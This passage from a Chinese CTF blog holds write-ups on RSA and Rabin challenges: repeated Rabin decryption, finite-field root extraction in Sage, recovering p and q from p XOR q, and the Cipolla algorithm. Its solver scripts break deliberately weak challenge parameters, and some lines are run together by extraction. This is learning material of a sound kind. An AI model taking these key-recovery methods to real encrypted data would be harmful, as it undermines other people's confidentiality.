<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">n = <span class="number">9057141637995599750120273501711128117576789048411357158233050845658505488383724832915968443730006384810721595601723748471745315354759415044859624198755098491311647992728384572103262800310263916249536898582100747311978019829291619921741682336800665277699122504431456051606407509905004993708771825443764723285750825546500765451509998514747599779552241055519485714649825416851221219747115910385536482995890893190128149999622905611239433481756073333147782531765685320972075370276543786386451560493093416152466142374684450770169257924330366774896526508005296520372463932722237001341584625279676089901419404816917142209281664709940400762785892142918132066900664643155176180059403739</span></span><br><span class="line">c = <span class="number">6154079784140816887542685430803768415772730865151861643444097840023705832386679112482482248555761414705162328220586794375708796741624024822642170217210511028105715354610593613478964243640521028593911375212807872252055918567650066306345785341153202754138305812184867107836136289838379556395327458734454660336699800924390962557002402007091633450515772419925142945911576659151187043837460255245980821089671602664201100487652703989786977247616381447061677369391575649093177311422333653297000175353974295682284617873674552426804866371781198162476631361431011867016121352914491629749793369865802944046427625798032718230196065884706861662254100563745138198499719367503185424667724305</span></span><br><span class="line">hint = <span class="number">99336867941885596246249572957476249207783802547583614060828305903417094663626785107521682819540923350225137906529404247068926777322082579296175450572566483806852214547909169221325677351559413990125595962992773728902865500358652248335066478896252289023954431595375774635699658560226625953577281314982639316733</span></span><br><span class="line"></span><br><span class="line">bp2 = n // hint</span><br><span class="line">p = (n-hint*bp2) // <span class="number">2</span></span><br><span class="line">q = hint*bp2//p + <span class="number">2</span></span><br><span class="line"><span class="keyword">assert</span> p*q == n</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rabin_decrypt</span>(<span class="params">C, P, Q, e=<span class="number">2</span></span>):</span></span><br><span class="line">    N = P * Q</span><br><span class="line">    mp = <span class="built_in">pow</span>(C, (p + <span class="number">1</span>) // <span class="number">4</span>, p)</span><br><span class="line">    mq = <span class="built_in">pow</span>(C, (q + <span class="number">1</span>) // <span class="number">4</span>, q)</span><br><span class="line">    yp = gmpy2.invert(P, Q)</span><br><span class="line">    yq = gmpy2.invert(Q, P)</span><br><span class="line">    r = (yp * P * mq + yq * Q * mp) % N</span><br><span class="line">    rr = N - r</span><br><span class="line">    s = (yp * P * mq - yq * Q * mp) % N</span><br><span class="line">    ss = N - s</span><br><span class="line">    <span class="keyword">return</span> r, rr, s, ss</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">x = <span class="number">0</span></span><br><span class="line">m32 = rabin_decrypt(c, p, q)</span><br><span class="line">c16 = m32</span><br><span class="line"><span class="keyword">for</span> ct1 <span class="keyword">in</span> c16:</span><br><span class="line">    m16 = rabin_decrypt(ct1, p, q)</span><br><span class="line">    c8 = m16</span><br><span class="line">    <span class="keyword">for</span> ct2 <span class="keyword">in</span> c8:</span><br><span class="line">        m8 = rabin_decrypt(ct2, p, q)</span><br><span class="line">        c4 = m8</span><br><span class="line">        <span class="keyword">for</span> ct3 <span class="keyword">in</span> c4:</span><br><span class="line">            m4 = rabin_decrypt(ct3, p, q)</span><br><span class="line">            c2 = m4</span><br><span class="line">            <span class="keyword">for</span> ct4 <span class="keyword">in</span> c2:</span><br><span class="line">                m2 = rabin_decrypt(ct4, p, q)</span><br><span class="line">                c0 = m2</span><br><span class="line">                <span class="keyword">for</span> ct5 <span class="keyword">in</span> c0:</span><br><span class="line">                    m = rabin_decrypt(ct5, p, q)</span><br><span class="line">                    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                        <span class="built_in">print</span>(long_to_bytes(m[i]))</span><br><span class="line">                        x += <span class="number">1</span></span><br><span class="line">                        <span class="built_in">print</span>(x)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>跑出来个锤子，屑</p>
<h5 id="有限域开方"><a href="#有限域开方" class="headerlink" title="有限域开方"></a>有限域开方</h5><p>思路戛然而止，然后在黄大佬的鼓励下竟然问到了striving师傅，师傅给的思路如下：<br>一是ta肯定了我之前的思路（六次Rabin），二抛出一个新的概念“有限域开方”，并给了一个sage脚本，之前iscc的，改下数据</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>  *</span><br><span class="line"></span><br><span class="line">p = <span class="number">9379687248080546498203772982837534815766954373570511486116083159981413417096645798856014966365034522452474187942388010149804818006063740815276649712799481</span></span><br><span class="line">q = <span class="number">965612327836309010640336991047433695556810179336511247528907945718618156107162848744574747053330490898357406242669343584421656178908998516241378530330570381491082968636749226112679273570797410328924840246087961289024973946055035418636926676076633496570175998461069029639169285927893363926033338135217150878112745316881927877175031909168645360203144573306218025903594105264560446428458045534270979754915646333544338288343648100774469601136673371680101712576187426590347035135361532767157406425958991578025201218590389525619</span></span><br><span class="line">n = <span class="number">9057141637995599750120273501711128117576789048411357158233050845658505488383724832915968443730006384810721595601723748471745315354759415044859624198755098491311647992728384572103262800310263916249536898582100747311978019829291619921741682336800665277699122504431456051606407509905004993708771825443764723285750825546500765451509998514747599779552241055519485714649825416851221219747115910385536482995890893190128149999622905611239433481756073333147782531765685320972075370276543786386451560493093416152466142374684450770169257924330366774896526508005296520372463932722237001341584625279676089901419404816917142209281664709940400762785892142918132066900664643155176180059403739</span></span><br><span class="line">c = <span class="number">6154079784140816887542685430803768415772730865151861643444097840023705832386679112482482248555761414705162328220586794375708796741624024822642170217210511028105715354610593613478964243640521028593911375212807872252055918567650066306345785341153202754138305812184867107836136289838379556395327458734454660336699800924390962557002402007091633450515772419925142945911576659151187043837460255245980821089671602664201100487652703989786977247616381447061677369391575649093177311422333653297000175353974295682284617873674552426804866371781198162476631361431011867016121352914491629749793369865802944046427625798032718230196065884706861662254100563745138198499719367503185424667724305</span></span><br><span class="line">e= <span class="number">16</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = Zmod(p)[]</span><br><span class="line">f = x ^ e - c</span><br><span class="line">f = f.monic()</span><br><span class="line">res1 = f.roots()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = Zmod(q)[]</span><br><span class="line">f = x ^e - c</span><br><span class="line">f = f.monic()</span><br><span class="line">res2 = f.roots()</span><br><span class="line">m=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res1:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> res2:</span><br><span class="line">        m.append(CRT(<span class="built_in">int</span>(i[<span class="number">0</span>]),<span class="built_in">int</span>(j[<span class="number">0</span>]),p,q))</span><br><span class="line">e = <span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> C <span class="keyword">in</span> m:</span><br><span class="line">    R.&lt;x&gt; = Zmod(p)[]</span><br><span class="line">    f = x ^ e - C</span><br><span class="line">    f = f.monic()</span><br><span class="line">    res1 = f.roots()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    R.&lt;x&gt; = Zmod(q)[]</span><br><span class="line">    f = x ^e - C</span><br><span class="line">    f = f.monic()</span><br><span class="line">    res2 = f.roots()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> res1:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> res2:</span><br><span class="line">            M=CRT(<span class="built_in">int</span>(i[<span class="number">0</span>]),<span class="built_in">int</span>(j[<span class="number">0</span>]),p,q)</span><br><span class="line">            <span class="keyword">if</span> long_to_bytes(M).startswith(<span class="string">b&#x27;flag&#x27;</span>):</span><br><span class="line">                <span class="built_in">print</span>(long_to_bytes(M))</span><br></pre></td></tr></table></figure>

<img alt="easyRSA-75ae2c4a.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/easyRSA-75ae2c4a.png" width="" height="" >

<p>虽然跑了十分钟吧，但终归是出来了，好耶</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;congratss_to_uooo&#125;</span><br></pre></td></tr></table></figure>

<h5 id="Rabin-p-q-equiv1-mod-4"><a href="#Rabin-p-q-equiv1-mod-4" class="headerlink" title="Rabin $p,q\ \equiv1\ (mod\ 4)$"></a>Rabin $p,q\ \equiv1\ (mod\ 4)$</h5><p>然后返回去复现Rabin的解法，经老师提醒Rabin一般是适用p和q同模4余3（这就是我直接用Rabin写脚本出来不的原因之一吧），但是不满足该条件的网上也有相应的解法</p>
<img alt="easyRSA-34686019.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/easyRSA-34686019.png" width="" height="" >

<p>下面就是重点了，关于平方根算法的</p>
<p>简单来说一句话</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy.ntheory.residue_ntheory <span class="keyword">import</span> nthroot_modnthroot_mod(c, <span class="number">2</span>, n)</span><br></pre></td></tr></table></figure>

<p>深入了解还是去看论文吧，虽然这个链接<a href="https://xz.aliyun.com/t/5113">https://xz.aliyun.com/t/5113</a>上有现成的脚本</p>
<h2 id="classical（recuring）"><a href="#classical（recuring）" class="headerlink" title="classical（recuring）"></a>classical（recuring）</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *<span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *<span class="keyword">from</span> secret <span class="keyword">import</span> flagp, q = getPrime(<span class="number">1024</span>), getPrime(<span class="number">1024</span>)n = p * qe = 0x20002m = bytes_to_long(flag)c = <span class="built_in">pow</span>(m, e, n)<span class="built_in">print</span>(n)<span class="built_in">print</span>(p^q)<span class="built_in">print</span>(c)<span class="string">&#x27;&#x27;&#x27;14115093155264548284219850276976713894807135646407433952606241177170799620857407025703595509713850915829780548758828322672641152301034211705379026175072611331218908815311430949772272235565783721577000028261320417622996465873828778859895581557742322809089668839711806730037111219021594672886924179920040304097577013490236209729345268062386894230525646920709722753359165796352375582302187897324275077401465001693214034438313030500915688714866020374786738034712789705863769144687851817416283898692607558884892344860918856284384348045176373311592185711275374531053648357885260032561469921168991006893123688018793232724519497188122861492414602578425848600934678144500981097527533132908963142267585835277140715105650851427776345798975809859042715808309990010728580713944782201677862586124673726004942518404406641342018472872295089418936910392392317681226591247107962915310437445647813849192496020796695715409161065775168943315159429953949741013869942547068198121837302318253723877106218866850569125612168124953507720549935440414456694849794070623435967826780140286915427474882462420987431026322506726433159619207457167288303630066313113554335142157973136384138957974141794821690882492289219381289736054817877583941375031278015108767863108668566479010711087436814686693513769053008124914798460553425393111487695972525254979562410234110752805380574182432866694020891030485921135474591933136062338390086730078396980498629461268411340424502744686773297853639711048789055056501585346987725433868282476192206326121122527472482411928363635793163788685739&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>代码也好简洁，就把p和q异或了一下</p>
<p>但我还是不会做</p>
<p>时隔几个月前来复现，希望能解出来</p>
<p><code>e=0x20002</code>显然是0x10001的两倍，所以先开平方根再常规没什么好说的</p>
<p>呜呜呜，学了两三个月了，还是不会做，我太菜了</p>
<p><em>然后在打第五空间的时候，发现第三题和这个好像啊。一些机缘巧合我竟然问到了出题人，师傅有一天突然加我（可能是抓到我混进萌新赛了吧），然后在很多比赛的群里没有搜到师傅的id，以为是骗子就没加，然后唔，今天手空扫了blue whale的招新群，结果发现师傅是管理员，结合我之前在他们网站上刷水题，就问他要wp，然后就被师傅骂了。骂完还是很好地向我提供了解题思路。安全圈的奇妙氛围</em></p>
<p>师傅说的后面开平方根都可以理解，就是第一步分解n，用dfs广搜从低位到高位暴力搜索，emmmmmm请教了隔壁4cm的大佬，无果。不过由此出了道$p^q$的题目</p>
<hr>
<p>第二天我冷静下来思考，发现原来是这么一回事，bb前总结一下，其实暴露了p^q就相当于暴露了p和q，凭借一定的特征通过寻找路径的算法将p和q完美地求出来</p>
<p>取p^q和n的后几位做试验</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">r = 100110n = <span class="number">100111</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>最后一位是固定的没什么好说</p>
</li>
<li><p>倒数第二位因为r对应的位数是<code>1</code>，所以p和q要么是<code>01</code>要么是<code>10</code>，这里分不分类没差</p>
</li>
<li><p>倒数第三位r对应的也是<code>1</code>，先假设是<code>10</code>吧；这样推导倒数第四位是<code>0</code>，说明p和q的倒数第四位bit相同，假设是<code>00</code>，显然不行，如图</p>
</li>
</ul>
<img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210917215229389.png" alt="image-20210917215229389"/>

<p>​    假设是<code>11</code>，同样也是不行。说明此路不通，第三步假设的<code>10</code>是错误的，应该是<code>01</code></p>
<img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210917220853630.png" alt="image-20210917220853630"/>

<ul>
<li>第四步以及后面类似</li>
</ul>
<p>所以就需要一个找路径的算法，这里先贴个5space的wp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage</span></span><br><span class="line"><span class="comment">#-*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span>  tqdm</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"><span class="keyword">from</span> sympy.ntheory.residue_ntheory <span class="keyword">import</span> nthroot_mod</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">partial_p</span>(<span class="params">p0, kbits, n</span>):</span></span><br><span class="line">    <span class="comment"># PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span></span><br><span class="line"></span><br><span class="line">    PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    f = <span class="number">2</span>^kbits*x + p0</span><br><span class="line">    f = f.monic()</span><br><span class="line">    roots = f.small_roots(X=<span class="number">2</span>^(<span class="number">512</span>-<span class="number">400</span>), beta=<span class="number">0.3</span>)</span><br><span class="line">    <span class="keyword">if</span> roots:</span><br><span class="line">        x0 = roots[<span class="number">0</span>]</span><br><span class="line">        p = gcd(<span class="number">2</span>^kbits*x0 + p0, n)</span><br><span class="line">        <span class="keyword">return</span> ZZ(p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c = <span class="number">9953949741013869942547068198121837302318253723877106218866850569125612168124953507720549935440414456694849794070623435967826780140286915427474882462420987431026322506726433159619207457167288303630066313113554335142157973136384138957974141794821690882492289219381289736054817877583941375031278015108767863108668566479010711087436814686693513769053008124914798460553425393111487695972525254979562410234110752805380574182432866694020891030485921135474591933136062338390086730078396980498629461268411340424502744686773297853639711048789055056501585346987725433868282476192206326121122527472482411928363635793163788685739</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">14115093155264548284219850276976713894807135646407433952606241177170799620857407025703595509713850915829780548758828322672641152301034211705379026175072611331218908815311430949772272235565783721577000028261320417622996465873828778859895581557742322809089668839711806730037111219021594672886924179920040304097577013490236209729345268062386894230525646920709722753359165796352375582302187897324275077401465001693214034438313030500915688714866020374786738034712789705863769144687851817416283898692607558884892344860918856284384348045176373311592185711275374531053648357885260032561469921168991006893123688018793232724519</span></span><br><span class="line">x = <span class="number">49718812286149241460257842584860093467814450098109752753313290896314226758583527714071510565085142777634579897580985904271580830999001072858071394478220167786258612467372600494251840440664134201847287229508941893691039239231768122659124710796291531043744564781384919249602079669571540916106577516894331515942</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solver</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, x, n</span>):</span></span><br><span class="line">        self.x = x</span><br><span class="line">        self.n = n</span><br><span class="line">        self.pq = [(<span class="number">0</span>, <span class="number">0</span>)]</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">self, b, p, q</span>):</span></span><br><span class="line">        <span class="comment"># print(bin((p * q) &amp; (2*b-1)))</span></span><br><span class="line">        <span class="comment"># print(bin(n &amp; (2*b-1)))</span></span><br><span class="line">        <span class="keyword">if</span> (p * q) &amp; (<span class="number">2</span>*b-<span class="number">1</span>) == n &amp; (<span class="number">2</span>*b-<span class="number">1</span>):</span><br><span class="line">            self.pq.append((p, q))</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">solve</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">for</span> shift <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">0</span>, <span class="number">1024</span>)):</span><br><span class="line">            b = <span class="number">1</span> &lt;&lt; shift</span><br><span class="line">            pq, self.pq = self.pq, []</span><br><span class="line">            <span class="keyword">for</span> p, q <span class="keyword">in</span> pq:</span><br><span class="line">                <span class="keyword">if</span> self.x &amp; b:</span><br><span class="line">                    self.add(b, p | b, q)</span><br><span class="line">                    self.add(b, p, q | b)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    self.add(b, p, q)</span><br><span class="line">                    self.add(b, p | b, q | b)</span><br><span class="line">        <span class="keyword">return</span> self.pq</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span>():</span></span><br><span class="line">    solver = Solver(x,n)</span><br><span class="line">    pqs = solver.solve()</span><br><span class="line">    <span class="keyword">for</span> pq <span class="keyword">in</span> tqdm(pqs):</span><br><span class="line">        p0 = ZZ(pq[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">if</span> n % p0 == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> p0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = solve()</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> p:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;WTF&#x27;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line">q = n // p</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">power</span>(<span class="params">s1, s2, k1, k2, w, p</span>):</span></span><br><span class="line">    <span class="keyword">return</span> ((s1*k1+s2*k2*w)%p, (s1*k2+s2*k1)%p)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Cipolla_algorithm</span>(<span class="params">p, n</span>):</span></span><br><span class="line">    a = randint(<span class="number">1</span>, p)</span><br><span class="line">    w = a ** <span class="number">2</span> - n</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">pow</span>(w, (p-<span class="number">1</span>)/<span class="number">2</span>, p) !=p-<span class="number">1</span> :</span><br><span class="line">        a = randint(<span class="number">1</span>, p)</span><br><span class="line">        w = a ** <span class="number">2</span> - n</span><br><span class="line"></span><br><span class="line">    times = (p+<span class="number">1</span>)/<span class="number">2</span></span><br><span class="line"></span><br><span class="line">    k1 = <span class="number">1</span></span><br><span class="line">    k2 = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    first = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    sum1 = <span class="number">1</span></span><br><span class="line">    sum2 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> times != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> first:</span><br><span class="line">            k1, k2=power(k1, k2, a, <span class="number">1</span>, w, p)</span><br><span class="line">            first = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            k1, k2=power(k1, k2, k1, k2, w, p)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> times &amp; <span class="number">1</span>:</span><br><span class="line">            sum1, sum2 = power(sum1, sum2, k1, k2, w, p)</span><br><span class="line">        times &gt;&gt;= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> sum1</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CRT</span>(<span class="params">c, n</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(n)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i + <span class="number">1</span>, <span class="built_in">len</span>(n)):</span><br><span class="line">            <span class="keyword">assert</span> gcd(n[i], n[j]) == <span class="number">1</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(c) == <span class="built_in">len</span>(n)</span><br><span class="line"></span><br><span class="line">    N = reduce(<span class="keyword">lambda</span> a, b: a*b, n)</span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i, j <span class="keyword">in</span> <span class="built_in">zip</span>(c, n):</span><br><span class="line">        N_i = N/j</span><br><span class="line">        N_i_1 = invert(N_i, j)</span><br><span class="line">        x+=i*N_i*N_i_1</span><br><span class="line">    <span class="keyword">return</span> x % N</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    p = <span class="number">97789022547681650809933091642056359150836470891445993627949413086016719683911550390348524253338464108135525531721006469788306072638903125487128091084906431304397197863433093408542153418850907879262775592792761229127882079891050206567861588411053522722484920915639103903835446582738792406513866721081609034727</span></span><br><span class="line">    c = <span class="number">604109533640546717288614903413461044854900650125730200042163821752619770507166751125800700503843917800294862970797939065820252304433442778225561669457982600654960975625</span></span><br><span class="line">    e = <span class="number">65537</span></span><br><span class="line">    n = <span class="number">14115093155264548284219850276976713894807135646407433952606241177170799620857407025703595509713850915829780548758828322672641152301034211705379026175072611331218908815311430949772272235565783721577000028261320417622996465873828778859895581557742322809089668839711806730037111219021594672886924179920040304097577013490236209729345268062386894230525646920709722753359165796352375582302187897324275077401465001693214034438313030500915688714866020374786738034712789705863769144687851817416283898692607558884892344860918856284384348045176373311592185711275374531053648357885260032561469921168991006893123688018793232724519</span></span><br><span class="line">    x = <span class="number">49718812286149241460257842584860093467814450098109752753313290896314226758583527714071510565085142777634579897580985904271580830999001072858071394478220167786258612467372600494251840440664134201847287229508941893691039239231768122659124710796291531043744564781384919249602079669571540916106577516894331515942</span></span><br><span class="line">    q = n // p</span><br><span class="line">    get_x1 = Cipolla_algorithm(p, c)</span><br><span class="line">    get_x2 = Cipolla_algorithm(q, c)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span>  <span class="built_in">pow</span>(get_x1, <span class="number">2</span>, p) == c % p</span><br><span class="line">    <span class="keyword">assert</span>  <span class="built_in">pow</span>(get_x2, <span class="number">2</span>, q) == c % q</span><br><span class="line"></span><br><span class="line">    c11 = get_x1</span><br><span class="line">    c12 = p-get_x1</span><br><span class="line">    c21 = get_x2</span><br><span class="line">    c22 = q-get_x2</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;possible m :&#x27;</span> + long_to_bytes(<span class="built_in">str</span>(CRT([c11, c21], [p, q])))</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;possible m :&#x27;</span> + long_to_bytes(<span class="built_in">str</span>(CRT([c11, c22], [p, q])))</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;possible m :&#x27;</span> + long_to_bytes(<span class="built_in">str</span>(CRT([c12, c21], [p, q])))</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;possible m :&#x27;</span> + long_to_bytes(<span class="built_in">str</span>(CRT([c12, c22], [p, q])))</span><br></pre></td></tr></table></figure>

<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210918092847303.png" alt="image-20210918092847303"></p>
<p>？？？还有别的套娃</p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
  </entry>
  <entry>
    <title>CTFSHOW funnyrsa&amp;unusualrsa系列</title>
    <url>/posts/80806ae5/</url>
    <content><![CDATA[<p>这两个系列有针对RSA密码中，$gcd(e, phi)\neq 1$的，之前Striving师傅也说，这是一个考的大类，特地来重新整理和记录一下，主要是翻译一下la佬的博客</p>
<span id="more"></span>

<h1 id="CTFSHOW-funnyrsa-amp-unusualrsa系列"><a href="#CTFSHOW-funnyrsa-amp-unusualrsa系列" class="headerlink" title="CTFSHOW funnyrsa&amp;unusualrsa系列"></a>CTFSHOW funnyrsa&amp;unusualrsa系列</h1><h2 id="funnyrsa1"><a href="#funnyrsa1" class="headerlink" title="funnyrsa1"></a>funnyrsa1</h2><blockquote>
<p>题目描述</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">e1 = <span class="number">14606334023791426</span></span><br><span class="line">p1 = <span class="number">121009772735460235364940622989433807619211926015494087453674747614331295040063679722422298286549493698150690694965106103822315378461970129912436074962111424616439032849788953648286506433464358834178903821069564798378666159882090757625817745990230736982709059859613843100974349380542982235135982530318438330859</span></span><br><span class="line">q1 = <span class="number">130968576816900149996914427770826228884925960001279609559095138835900329492765336419489982304805369724685145941218640504262821549441728192761733409684831633194346504685627189375724517070780334885673563409259345291959439026700006694655545512308390416859315892447092639503318475587220630455745460309886030186593</span></span><br><span class="line">c1 = <span class="number">11402389955595766056824801105373550411371729054679429421548608725777586555536302409478824585455648944737304660137306241012321255955693234304201530700362069004620531537922710568821152217381257446478619320278993539785699090234418603086426252498046106436360959622415398647198014716351359752734123844386459925553497427680448633869522591650121047156082228109421246662020164222925272078687550896012363926358633323439494967417041681357707006545728719651494384317497942177993032739778398001952201667284323691607312819796036779374423837576479275454953999865750584684592993292347483309178232523897058253412878901324740104919248</span></span><br><span class="line"></span><br><span class="line">e2 = <span class="number">13813369129257838</span></span><br><span class="line">p2 = <span class="number">121009772735460235364940622989433807619211926015494087453674747614331295040063679722422298286549493698150690694965106103822315378461970129912436074962111424616439032849788953648286506433464358834178903821069564798378666159882090757625817745990230736982709059859613843100974349380542982235135982530318438330859</span></span><br><span class="line">q2 = <span class="number">94582257784130735233174402362819395926641026753071039760251190444144495369829487705195913337502962816079184062352678128843179586054535283861793827497892600954650126991213176547276006780610945133603745974181504975165082485845571788686928859549252522952174376071500707863379238688200493621993937563296490615649</span></span><br><span class="line">c2 = <span class="number">7984888899827615209197324489527982755561403577403539988687419233579203660429542197972867526015619223510964699107198708420785278262082902359114040327940253582108364104049849773108799812000586446829979564395322118616382603675257162995702363051699403525169767736410365076696890117813211614468971386159587698853722658492385717150691206731593509168262529568464496911821756352254486299361607604338523750318977620039669792468240086472218586697386948479265417452517073901655900118259488507311321060895347770921790483894095085039802955700146474474606794444308825840221205073230671387989412399673375520605000270180367035526919</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>解题思路</p>
</blockquote>
<p>我记得这道题当时困扰了我好久，看网上的WP，去问别的师傅，都不能很好地理解；主要是数论的基础不过关吧</p>
<p>现在再来过一遍</p>
<p>可以看出p1和p2是同一个数，e1和e2分可以分解成</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">e1 = <span class="number">2</span> * <span class="number">7</span> * <span class="number">1043309573127959</span></span><br><span class="line">e2 = <span class="number">2</span> * <span class="number">7</span> * <span class="number">986669223518417</span></span><br></pre></td></tr></table></figure>

<p>我直接用下有限域开方（这个后面unusualrsa5也会提到一些），直接出来</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210709101537063.png" alt="image-20210709101537063"></p>
<p>然后记得将中间那个奇怪的东西转换成φ</p>
<p>第一次遇到这道题，主要参考一篇CSDN上的推导，主要是当时e=14试过小指数枚举k，也开不出来就没啥思路了</p>
<p><a href="https://blog.csdn.net/chenzzhenguo/article/details/94339659">https://blog.csdn.net/chenzzhenguo/article/details/94339659</a></p>
<p>现在再观摩一遍又学到了好多，如果不用有限域开14次方的话，由于e=7已经和phi1和phi2都有公因子了，不能继续化简指数，而且经检验，q不满足rabin的条件<br>$$<br>q\ mod\ 4=1<br>$$<br>不过p没有<br>$$<br>p\ mod\ 4=3<br>$$<br>所以这位师傅想到了借助中国剩余定理的思路，着实巧妙</p>
<p>为了方便理清思绪，我把上面的脚本和得出来的新c1和c2展示一下</p>
